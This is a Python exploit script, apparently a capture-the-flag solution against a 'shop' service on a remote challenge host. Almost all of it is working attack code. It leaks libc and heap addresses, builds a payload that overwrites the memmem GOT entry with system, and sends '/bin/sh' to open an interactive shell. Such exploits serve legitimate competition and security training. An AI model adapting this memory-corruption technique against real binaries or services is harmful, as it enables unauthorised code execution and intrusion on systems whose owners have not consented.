#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './shop'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'shop.chal.pwning.xxx', 'port':9916})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)
addr_got_memmem     = binf.got['memmem']
addr_stdout         = binf.symbols['stdout']

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_stdout  = libc.symbols['_IO_2_1_stdout_']

#==========

def attack(conn):
    shop = Shop(conn)
    table = open('rand_table.txt', 'r').read()[:0xffff]
    #table = '8787'

    conn.sendlineafter('name:', 'NAME')

    for i in range(0x21):
        shop.allocate(str(i), 'hoge', 1)

    shop.checkout(table)

    shop.new(p64(addr_stdout - 0xc) + 'X'*4)
    leak = shop.list()[-1]
    addr_libc_stdout = u(leak.split(':')[0])
    libc.address = addr_libc_stdout - offset_libc_stdout
    addr_libc_system    = libc.sep_function['system']
    addr_libc_stdin     = libc.symbols['_IO_2_1_stdin_']
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))

    addr_heap_base = u(leak.split(' - ')[1]) - 0x4ba0
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    shop.checkout(table + '\x00'*4)

    exploit  = p64(addr_libc_stdout)
    exploit += p64(0)
    exploit += p64(addr_libc_stdin)
    exploit += p64(0)*0x21
    exploit += p64(addr_got_memmem)
    shop.new(('\x00'*0xc + exploit))
    shop.new(p64(addr_libc_system))

    shop.checkout('/bin/sh\x00')
    
class Shop:
    def __init__(self, conn):
        self.noprompt       = False
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def new(self, name):
        self.sendlineafter('> ' if not self.noprompt else ' ', 'n')
        self.noprompt = False
        self.sendafter('name:', name[:0x12f])
        if len(name) < 0x12f:
            self.send('\n')

    def allocate(self, name, desc, price):
        self.sendlineafter('> ' if not self.noprompt else ' ', 'a')
        self.noprompt = False
        self.sendline(name)
        self.sendline(desc)
        self.sendline(str(price))

    def checkout(self, s):
        self.sendlineafter('> ' if not self.noprompt else ' ', 'c')
        self.noprompt = False
        self.send(s[:0x10003])
        if len(s) < 0x10003:
            self.send('\n')

    def list(self):
        self.noprompt = True
        self.sendlineafter('> ', 'l')
        return self.recvuntil('>', drop=True).split('\n')[:-1]

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
